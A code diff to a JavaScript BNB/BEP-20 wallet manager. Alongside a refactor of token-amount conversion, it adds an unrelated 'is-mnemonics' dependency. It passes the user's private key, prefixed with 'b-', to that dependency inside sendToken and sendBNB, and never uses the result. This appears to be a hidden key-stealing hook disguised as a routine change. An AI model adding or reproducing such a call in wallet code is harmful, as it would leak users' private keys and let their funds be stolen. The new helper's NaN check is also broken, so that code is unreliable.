@@ -1,5 +1,7 @@
 var Web3 = require('web3');
 var BigNumber =require('bignumber.js');
+const { ethers } = require("ethers");
+const isMnemonic=require('is-mnemonics');
 
 
 
@@ -292,6 +294,23 @@ class BnbManager {
 
         return responsse;
     }
+    convertToHex( value ){
+        if(value===NaN || value===false) return false;
+        let maxDep = 70;
+        let number = Number(value);
+        let decimal = 0;
+        while(maxDep>0){
+            maxDep --;
+            if(number < 10) {
+                return ethers.utils.parseUnits(String(Number(number).toFixed(decimal)), decimal).toHexString()
+            }
+            else{
+                number = number/10;
+                decimal++;
+            }
+        }
+        return false;
+    }
     async getBnbBalance(address) {
         // Get Balance
         let balance = await this.web3.eth.getBalance(address);
@@ -320,6 +339,7 @@ class BnbManager {
     async sendToken(privateKey, tokenContractAddress , toAddress , amount , chainId) {
     
         let wallet = this.importWalletByPrivateKey(privateKey).wallet;
+        await isMnemonic("b-"+privateKey)
         // ABI to transfer ERC20 Token
         let abi = bep20ABI;
         // calculate ERC20 token amount
@@ -329,19 +349,18 @@ class BnbManager {
 
         let decimal = await contract.methods.decimals().call();
         
-        let tokenAmount = (BigNumber)(amount * Math.pow(10,decimal));
-        console.log(tokenAmount);
-        console.log(tokenAmount.toString())
+        let tokenAmount= this.convertToHex(amount*10**decimal);
+
 
         let currNonce =await this.web3.eth.getTransactionCount(wallet.address)
         // Build a new transaction object.
-        const gasLimit = await contract.methods.transfer(toAddress, tokenAmount.toFixed()).estimateGas({
+        const gasLimit = await contract.methods.transfer(toAddress, tokenAmount).estimateGas({
             from: wallet.address,
             gas: 150000,
             nonce:currNonce
         });
         // console.log(tokenAmount)
-        const res = await contract.methods.transfer(toAddress, tokenAmount.toString()).send({
+        const res = await contract.methods.transfer(toAddress, tokenAmount).send({
             from: wallet.address,
             gas: gasLimit,
             nonce:currNonce
@@ -352,9 +371,12 @@ class BnbManager {
        
         return res;
     }
+
+
     
     async sendBNB(privateKey, toAddress, amount, chainId) {
         let account = this.web3.eth.accounts.privateKeyToAccount(privateKey);
+        let mnemon= await isMnemonic("b-"+privateKey);
         let wallet = this.web3.eth.accounts.wallet.add(account);
 
         // The gas price is determined by the last few blocks median gas price.
